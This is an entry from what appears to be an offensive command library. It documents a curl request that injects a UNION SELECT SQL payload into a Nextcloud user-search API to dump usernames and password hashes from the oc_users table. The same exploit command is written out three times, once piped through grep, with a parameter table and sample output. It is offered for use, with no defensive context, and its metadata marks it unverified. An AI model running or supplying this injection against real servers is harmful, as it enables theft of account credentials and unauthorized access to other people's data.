---
id: cmd-curl-sqli-exfil
data: >-
  curl -X GET "https://target-nextcloud.com/ocs/v2.php/cloud/users?search='
  UNION SELECT username,password FROM oc_users--" -H "OCS-APIRequest: true" -H
  "Accept: application/json"
tags:
  - sqli
  - exfiltration
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.937Z'
verified: false
validated: true
submitted: true
---
# curl-sqli-dump

## Command

```bash
curl -X GET "https://target-nextcloud.com/ocs/v2.php/cloud/users?search=' UNION SELECT username,password FROM oc_users--" -H "OCS-APIRequest: true" -H "Accept: application/json"
```

## Description

This command exploits SQL injection to dump sensitive data from the oc_users table using a UNION SELECT payload, extracting usernames and hashed passwords from the Nextcloud database.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `URL with ?search=' UNION SELECT ...--` | Target with UNION-based payload | Yes |
| `-H "OCS-APIRequest: true"` | Nextcloud OCS API header | Yes |
| `-H "Accept: application/json"` | JSON response format | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target-nextcloud.com/ocs/v2.php/cloud/users?search=' UNION SELECT username,password FROM oc_users--" -H "OCS-APIRequest: true" -H "Accept: application/json"
```

### Advanced Usage

With silent mode and grep for data:

```bash
curl -s -X GET "https://target-nextcloud.com/ocs/v2.php/cloud/users?search=' UNION SELECT username,password FROM oc_users--" -H "OCS-APIRequest: true" -H "Accept: application/json" | grep -o '"display-name":"[^"]*"'
```

## Expected Output

JSON response embedding database data, e.g., {"ocs":{"data":{"users":[{"display-name":"admin","value":"hashed_password"},...]}}}, revealing sensitive information.

## Related

- [[Related Procedure|procedures/Exploit-Unauthenticated-SQL-Injection-in-Nextcloud-User-Lookup]]
